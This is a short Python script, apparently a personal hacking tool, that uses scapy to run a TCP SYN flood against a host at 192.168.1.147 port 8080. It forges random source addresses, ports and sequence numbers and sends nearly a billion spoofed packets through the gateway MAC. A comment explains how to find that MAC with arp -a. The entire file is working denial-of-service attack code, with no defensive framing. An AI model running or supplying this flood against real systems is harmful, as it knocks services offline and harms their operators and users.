from scapy.all import sendp
from ipaddress import IPv4Address
from random import getrandbits

from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether

#### Tried with mac addr as broadcast but didn't work          ####
#### Put the gateway's mac address, u can find it with arp -a  ####


targetIP = "192.168.1.147"
targetPort = 8080
nPackets = 999999999
counter = 0

ip = IP(dst=targetIP)
tcp = TCP(dport=8080, flags='S')
eth = Ether(dst="f4:f4:f4:f4:f4:f4")
pkt = eth/ip/tcp

while counter < nPackets:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq = getrandbits(32)
    sendp(pkt, iface ='wlp2s0', verbose=0)
    counter+=1








